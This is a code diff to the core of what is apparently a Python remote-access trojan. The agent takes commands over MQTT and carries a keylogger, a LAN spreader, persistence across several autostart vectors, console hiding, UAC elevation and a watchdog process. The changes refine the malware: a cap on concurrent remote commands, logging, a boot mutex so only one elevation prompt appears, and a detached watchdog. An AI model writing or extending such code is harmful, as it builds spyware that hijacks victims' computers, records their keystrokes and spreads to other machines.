@@ -4,6 +4,7 @@ from __future__ import annotations
 
 import hashlib
 import os
+import random
 import socket
 import subprocess
 import sys
@@ -12,12 +13,16 @@ import time
 import traceback
 from typing import Any
 
-from .. import __version__, config, crypto, protocol, guardian
+from .. import __version__, config, crypto, log, protocol, guardian
 from ..mqtt import MqttClient, random_client_id
 from ..lan.beacon import LanService
 from ..lan.spread import Spreader
 from . import commands, health, persistence, runtime, stealth, sysinfo, updater
 from .inputs import Keylogger
+
+#: Concurrent command ceiling. A broadcast otherwise spawns one thread per
+#: message with no limit.
+_COMMAND_SLOTS = threading.BoundedSemaphore(config.MAX_CONCURRENT_COMMANDS)
 
 
 class Agent:
@@ -51,6 +56,7 @@ class Agent:
             "config": config, "sysinfo": sysinfo,
         }
 
+        self._log = log.get("core")
         self._client: MqttClient | None = None
         self._connected = threading.Event()
         self._last_persistence_check = 0.0
@@ -105,8 +111,8 @@ class Agent:
                 self.codec.encode(message),
                 qos=0 if message.get("t") == "evt" else 1,
             )
-        except Exception:
-            pass
+        except Exception as error:
+            self._log.debug("publish failed: %s", error)
 
     def hello_payload(self) -> dict[str, Any]:
         """The identity document sent on connect and on every heartbeat."""
@@ -143,8 +149,13 @@ class Agent:
 
         kind = message.get("t")
         if kind == "cmd":
-            threading.Thread(target=commands.execute, args=(self, message.get("d", "")),
-                             name="cmd", daemon=True).start()
+            line = message.get("d", "")
+
+            def _run() -> None:
+                with _COMMAND_SLOTS:
+                    commands.execute(self, line)
+
+            threading.Thread(target=_run, name="cmd", daemon=True).start()
         elif kind == "roster":
             self._peer_ids = {str(x) for x in (message.get("ids") or []) if x}
         elif kind == "put":
@@ -234,9 +245,10 @@ class Agent:
                     self._last_persistence_check = now
                     actions = persistence.ensure() + guardian.ensure()
                     if actions:
+                        self._log.info("persistence: %s", ", ".join(actions))
                         self.send({"t": "note", "d": "persistence: " + ", ".join(actions)})
-            except Exception:
-                pass
+            except Exception as error:
+                self._log.warning("housekeeping failed: %s", error, exc_info=True)
 
     def _spawn_watchdog(self) -> None:
         """Start the supervisor twin if one is not already running."""
@@ -248,7 +260,7 @@ class Agent:
         if owner and owner != os.getpid() and stealth.process_alive(owner):
             return
 
-        command = [sys.executable, self.bundle_entry, "--watchdog"]
+        command = [sys.executable, self.bundle_entry, "--watchdog", "--no-elevate"]
         if os.name == "nt":
             python = runtime.interpreter()
             if python.lower().endswith("python.exe"):
@@ -258,10 +270,11 @@ class Agent:
             command = [python, self.bundle_entry, "--watchdog"]
 
         try:
-            subprocess.Popen(command, close_fds=True,
-                             creationflags=0x00000200 if os.name == "nt" else 0)
-        except OSError:
-            pass
+            subprocess.Popen(
+                command, close_fds=True,
+                creationflags=(0x00000008 | 0x00000200) if os.name == "nt" else 0)
+        except OSError as error:
+            self._log.warning("watchdog spawn failed: %s", error)
 
     # ------------------------------------------------------------------
     # Transport
@@ -385,10 +398,24 @@ def main(argv: list[str] | None = None) -> int:
         print("\n".join(persistence.install()))
         return 0
 
-    # Auto-elevate to Administrator on Windows if running unprivileged
-    if stealth.IS_WINDOWS and not stealth.is_admin() and os.environ.get("SYSPY_NO_UAC") != "1" and "--no-elevate" not in argv:
-        if stealth.elevate_process(argv):
-            return 0
+    # Elevate at most once per boot. Six autostart vectors fire together at
+    # logon; without the claim each one raised its own UAC prompt before the
+    # mutex was ever consulted.
+    want_elevate = (
+        stealth.IS_WINDOWS
+        and not stealth.is_admin()
+        and os.environ.get("SYSPY_NO_UAC") != "1"
+        and "--no-elevate" not in argv
+    )
+    if want_elevate:
+        if stealth.claim_boot():
+            log.get("core.boot").info("boot claim won, requesting elevation")
+            if stealth.elevate_process(argv):
+                return 0
+            log.get("core.boot").warning("elevation declined or failed, running unelevated")
+        else:
+            time.sleep(random.uniform(1.5, 4.0))
+            log.get("core.boot").info("boot claim lost, waiting for the elevated instance")
 
     if stealth.acquire_single_instance(takeover):
         return 0
@@ -398,8 +425,11 @@ def main(argv: list[str] | None = None) -> int:
     if "--visible" not in argv and "--debug" not in argv:
         stealth.hide_console()
 
+    log.setup(os.path.join(stealth.primary_directory(), "logs"), tag="agent")
+    log.get("core").info("agent starting pid=%s admin=%s", os.getpid(), stealth.is_admin())
     runtime.ensure()
-    persistence.install()
+    for action in persistence.install():
+        log.get("core.persistence").info("install: %s", action)
     persistence.install_copies()
 
     agent = Agent()
